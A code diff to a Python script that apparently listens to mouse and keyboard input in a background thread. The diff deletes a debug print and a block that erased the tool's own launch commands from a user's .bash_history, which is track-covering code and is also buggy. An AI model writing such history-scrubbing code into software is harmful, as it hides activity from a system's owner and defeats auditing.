@@ -14,7 +14,6 @@ def vary (x, y, button, pressed):
     
     lastwasntrelease = True
     while(True):
-        print(c)
         if (button == Button.left and pressed and lastwasntrelease and c[1]==1):
             random.seed(time.time()**2/4 -2)
             m = random.randint(0,100)
@@ -64,23 +63,7 @@ def dlis ():
         listenerk.join()
 
 def main ():
-    c.append(17)
-    c.append(1)
-    f = open("/home/teto/.bash_history",'w')
-    fr = open("/home/teto/.bash_history",'r')
-    x = fr.read().split('\n')
-    for i in range(len(x)):
-        if x[i] == "python main.py":
-            x.pop(i)
-        elif x[i]== "screen -S h":
-            x.pop(i)
-        elif x[i] == "cd hanger":
-            x.pop(i)
-        elif x[i] =="./hhh":
-            x.pop(i)
-    f.writelines(x)
-    f.close()
-    fr.close()
+    
 
     t=threading.Thread(target=dlis)
     
